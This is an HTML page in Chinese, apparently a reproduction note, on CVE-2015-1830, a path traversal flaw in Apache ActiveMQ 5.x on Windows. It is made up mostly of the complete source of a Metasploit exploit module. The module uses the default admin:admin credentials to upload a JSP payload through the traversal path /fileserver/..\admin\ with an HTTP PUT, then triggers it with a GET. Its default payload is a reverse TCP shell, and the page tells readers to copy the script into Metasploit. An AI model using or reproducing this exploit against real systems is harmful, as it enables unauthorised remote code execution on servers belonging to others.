<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.csD1E291E2{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="cve-2015-1830activemq-路径遍历导致未经身份验证的rce"><span class="csECDA2D3">（</span><span class="csDE05BCC">CVE-2015-1830</span><span class="csECDA2D3">）</span><span class="csDE05BCC">ActiveMQ </span><span class="csECDA2D3">路径遍历导致未经身份验证的</span><span class="csDE05BCC">rce</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">Windows 5.11.2</span><span class="cs9C1B1871">之前的</span><span class="cs8926E06">Apache ActiveMQ 5.x</span><span class="cs9C1B1871">中</span><span class="cs8926E06">blob</span><span class="cs9C1B1871">消息的文件服务器上载</span><span class="cs8926E06">/</span><span class="cs9C1B1871">下载功能中的目录遍历漏洞允许远程攻击者通过未指定的向量在任意目录中创建</span><span class="cs8926E06">JSP</span><span class="cs9C1B1871">文件。</span></p><h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">ActiveMQ 5.11.1</span></p><h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<h3 class="cs868C439D">
			<a name="msf-poc"><span class="csD1E291E2">msf poc</span></a></h3>
		<p class="cs6FD73CFB"><span class="cs9C1B1871">直接在</span><span class="cs8926E06">msf</span><span class="cs9C1B1871">里面搜索就行了，如果没有请更新</span><span class="cs8926E06">msf</span><span class="cs9C1B1871">版本，或者手动复制下面的脚本到</span><span class="cs8926E06">msf</span><span class="cs9C1B1871">目录下。</span></p><p class="cs3A447A38"><span class="cs9FB05234">##</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># This module requires Metasploit: https://metasploit.com/download</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Current source: https://github.com/rapid7/metasploit-framework</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">##</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">class MetasploitModule &lt; Msf::Exploit::Remote</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;Rank = ExcellentRanking</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;include Msf::Exploit::Remote::HttpClient</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;def initialize(info = {})</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;super(update_info(info,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;Name&#39; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&gt; &#39;Apache ActiveMQ 5.x-5.11.1 Directory Traversal Shell Upload&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;Description&#39; &nbsp;&nbsp;&nbsp;=&gt; %q{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;This module exploits a directory traversal vulnerability (CVE-2015-1830) in Apache</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ActiveMQ 5.x before 5.11.2 for Windows.</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The module tries to upload a JSP payload to the /admin directory via the traversal</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;path /fileserver/..\\admin\\ using an HTTP PUT request with the default ActiveMQ</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;credentials admin:admin (or other credentials provided by the user). It then issues</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;an HTTP GET request to /admin/&lt;payload&gt;.jsp on the target in order to trigger the</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;payload and obtain a shell.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;},</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;Author&#39; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;David Jorm&#39;, &nbsp;&nbsp;&nbsp;&nbsp;# Discovery and exploit</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;Erik Wynter&#39; &nbsp;&nbsp;&nbsp;&nbsp;# @wyntererik - Metasploit</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;],</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;References&#39; &nbsp;&nbsp;&nbsp;&nbsp;=&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[ &#39;CVE&#39;, &#39;2015-1830&#39; ],</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[ &#39;EDB&#39;, &#39;40857&#39;],</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[ &#39;URL&#39;, &#39;https://activemq.apache.org/security-advisories.data/CVE-2015-1830-announcement.txt&#39; ]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;],</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;Privileged&#39; &nbsp;&nbsp;&nbsp;&nbsp;=&gt; false,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;Platform&#39; &nbsp;&nbsp;&nbsp;=&gt; %w{ win },</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;Targets&#39; &nbsp;&nbsp;&nbsp;&nbsp;=&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[ &#39;Windows Java&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;Arch&#39; =&gt; ARCH_JAVA,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;Platform&#39; =&gt; &#39;win&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;],</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;],</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;DisclosureDate&#39; =&gt; &#39;2015-08-19&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;License&#39; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&gt; MSF_LICENSE,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;DefaultOptions&#39; &nbsp;=&gt; {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;RPORT&#39; =&gt; 8161,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;PAYLOAD&#39; =&gt; &#39;java/jsp_shell_reverse_tcp&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;},</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;DefaultTarget&#39; &nbsp;=&gt; 0))</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;register_options([</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OptString.new(&#39;TARGETURI&#39;, [true, &#39;The base path to the web application&#39;, &#39;/&#39;]),</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OptString.new(&#39;PATH&#39;, &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[true, &#39;Traversal path&#39;, &#39;/fileserver/..\\admin\\&#39;]),</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OptString.new(&#39;USERNAME&#39;, [true, &#39;Username to authenticate with&#39;, &#39;admin&#39;]),</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OptString.new(&#39;PASSWORD&#39;, [true, &#39;Password to authenticate with&#39;, &#39;admin&#39;])</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;])</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;end</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;def check</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print_status(&quot;Running check...&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;testfile = Rex::Text::rand_text_alpha(10)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;testcontent = Rex::Text::rand_text_alpha(10)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;send_request_cgi({</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;uri&#39; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&gt; normalize_uri(target_uri.path, datastore[&#39;PATH&#39;], &quot;#{testfile}.jsp&quot;),</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;headers&#39; &nbsp;&nbsp;&nbsp;&nbsp;=&gt; {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;Authorization&#39; =&gt; basic_auth(datastore[&#39;USERNAME&#39;], datastore[&#39;PASSWORD&#39;])</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;},</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;method&#39; &nbsp;&nbsp;&nbsp;=&gt; &#39;PUT&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;data&#39; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&gt; &quot;&lt;% out.println(\&quot;#{testcontent}\&quot;);%&gt;&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;})</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;res1 = send_request_cgi({</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;uri&#39; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&gt; normalize_uri(target_uri.path,&quot;admin/#{testfile}.jsp&quot;),</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;headers&#39; &nbsp;&nbsp;&nbsp;&nbsp;=&gt; {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;Authorization&#39; =&gt; basic_auth(datastore[&#39;USERNAME&#39;], datastore[&#39;PASSWORD&#39;])</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;},</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;method&#39; &nbsp;&nbsp;&nbsp;=&gt; &#39;GET&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;})</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if res1 &amp;&amp; res1.body.include?(testcontent)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;send_request_cgi(</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;opts = {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;uri&#39; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&gt; normalize_uri(target_uri.path,&quot;admin/#{testfile}.jsp&quot;),</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;headers&#39; &nbsp;&nbsp;&nbsp;&nbsp;=&gt; {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;Authorization&#39; =&gt; basic_auth(datastore[&#39;USERNAME&#39;], datastore[&#39;PASSWORD&#39;])</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;},</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;method&#39; &nbsp;&nbsp;&nbsp;=&gt; &#39;DELETE&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;},</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;timeout = 1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return Exploit::CheckCode::Vulnerable</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;end</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;Exploit::CheckCode::Safe</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;end</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;def exploit</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print_status(&quot;Uploading payload...&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;testfile = Rex::Text::rand_text_alpha(10)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;vprint_status(&quot;If upload succeeds, payload will be available at #{target_uri.path}admin/#{testfile}.jsp&quot;) #This information is provided to allow for manual execution of the payload in case the upload is successful but the GET request issued by the module fails.</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;send_request_cgi({</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;uri&#39; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&gt; normalize_uri(target_uri.path, datastore[&#39;PATH&#39;], &quot;#{testfile}.jsp&quot;),</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;headers&#39; &nbsp;&nbsp;&nbsp;&nbsp;=&gt; {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;Authorization&#39; =&gt; basic_auth(datastore[&#39;USERNAME&#39;], datastore[&#39;PASSWORD&#39;])</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;},</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;method&#39; &nbsp;&nbsp;&nbsp;=&gt; &#39;PUT&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;data&#39; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&gt; payload.encoded</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;})</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print_status(&quot;Payload sent. Attempting to execute the payload.&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;res = send_request_cgi({</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;uri&#39; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&gt; normalize_uri(target_uri.path,&quot;admin/#{testfile}.jsp&quot;),</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;headers&#39; &nbsp;&nbsp;&nbsp;&nbsp;=&gt; {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;Authorization&#39; =&gt; basic_auth(datastore[&#39;USERNAME&#39;], datastore[&#39;PASSWORD&#39;])</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;},</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;method&#39; &nbsp;&nbsp;&nbsp;=&gt; &#39;GET&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;})</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if res &amp;&amp; res.code == 200</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print_good(&quot;Payload executed!&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;else</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fail_with(Failure::PayloadFailed, &quot;Failed to execute the payload&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;end</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;end</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">end</span></p></body>
</html>
